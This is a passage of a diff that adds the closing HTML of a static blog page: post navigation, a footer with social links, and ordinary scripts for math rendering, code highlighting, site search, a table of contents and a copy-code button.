+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Index</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="facebook,twitter"
+                data-mobile-sites="">Share on:</div>
+        </div>
+    </div>
+</nav>
+
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://fmash16.github.io/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2020  -
+    2020
+    
+    
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"></script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://fmash16.github.io/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://fmash16.github.io/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+            },
+            ROOT_URL: 'https:\/\/fmash16.github.io\/',
+            CONTENT_URL: 'https:\/\/fmash16.github.io\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://fmash16.github.io/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
+            }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
+
+                button.blur();
+
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
+</script>
+
+
+
+  </body>
+</html>
